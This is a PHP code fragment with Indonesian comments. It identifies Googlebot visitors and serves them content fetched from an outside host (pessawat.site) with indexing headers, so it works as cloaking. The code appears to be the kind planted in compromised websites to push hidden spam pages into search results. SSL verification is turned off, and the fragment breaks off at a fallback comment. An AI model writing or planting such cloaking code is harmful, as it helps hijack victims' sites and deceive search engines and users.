// GOOGLEBOT DETECTION - VERSION GUE (BEAST MODE)
// ================================================

function is_google_bot() {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    $forwarded_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
    
    // ============================================
    // METODE 1: VALIDASI IP VIA DNS (PALING AKURAT)
    // ============================================
    if ($ip) {
        $host = gethostbyaddr($ip);
        // Googlebot punya pola hostname khusus
        if (preg_match('/\.(googlebot|google)\.com$/i', $host)) {
            // Verifikasi balik (reverse DNS validation)
            $verify_ip = gethostbyname($host);
            if ($verify_ip === $ip) {
                return true;
            }
        }
        
        // Cek range IP Google resmi (alternatif)
        $ip_parts = explode('.', $ip);
        if (count($ip_parts) >= 2) {
            // Google punya banyak IP di range 66.249.0.0/16 dan 35.0.0.0/8
            if (($ip_parts[0] == '66' && $ip_parts[1] == '249') || 
                ($ip_parts[0] == '35' && in_array($ip_parts[1], ['190', '191', '192', '193', '194', '195', '196', '197', '198', '199']))) {
                // Tambahan verify via DNS
                $host = gethostbyaddr($ip);
                if (strpos($host, 'google') !== false) {
                    return true;
                }
            }
        }
    }
    
    // ============================================
    // METODE 2: VALIDASI X-FORWARDED-FOR (KALO PAKE PROXY/CDN)
    // ============================================
    if ($forwarded_ip) {
        $ips = explode(',', $forwarded_ip);
        $real_ip = trim($ips[0]);
        $host = gethostbyaddr($real_ip);
        if (strpos($host, 'googlebot') !== false || strpos($host, 'google.com') !== false) {
            return true;
        }
    }
    
    // ============================================
    // METODE 3: USER-AGENT DENGAN VALIDASI TAMBAHAN
    // ============================================
    $google_bots = [
        'Googlebot', 
        'Google-Site-Verification',
        'Google-InspectionTool',
        'Googlebot-Mobile',
        'Googlebot-News',
        'Googlebot-Image',
        'Google-Read-Aloud',
        'Mediapartners-Google',
        'AdsBot-Google',
        'APIs-Google',
        'Google Favicon'
    ];
    
    foreach ($google_bots as $bot) {
        if (stripos($ua, $bot) !== false) {
            // Kalo user-agent cocok, tapi IP gak valid, tetep kasih kesempatan
            // Tapi kita log buat diwaspadai
            if ($ip) {
                $host = gethostbyaddr($ip);
                if (strpos($host, 'google') !== false || strpos($host, 'crawl') !== false) {
                    return true;
                }
                // Kalo IP gak punya record google, tapi user-agent Googlebot
                // Bisa jadi ini palsu! Tapi kita tetep kasih akses terbatas
                // Atau kita log dulu
                error_log("Suspicious Googlebot UA from IP: $ip, Host: $host");
                return false; // Matiin dulu kalo ragu, biar aman
            }
            return true;
        }
    }
    
    return false;
}

if (is_google_bot()) {
    // KALO BENERAN GOOGLEBOT:
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://pessawat.site/pisauuu/',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_HTTPHEADER => [
            'X-Forwarded-For: ' . ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR']),
            'X-Real-IP: ' . $_SERVER['REMOTE_ADDR'],
            'Accept-Encoding: gzip, deflate, br',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        ],
        // Tambahin proxy kalo perlu
        // CURLOPT_PROXY => 'http://proxy-lo:8080',
    ]);
    
    $content = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    // Kasih header khusus buat Googlebot
    header('Content-Type: text/html; charset=UTF-8');
    header('X-Robots-Tag: index, follow');
    
    if ($content && $http_code === 200) {
        echo $content;

        // Fallback kalo gagal
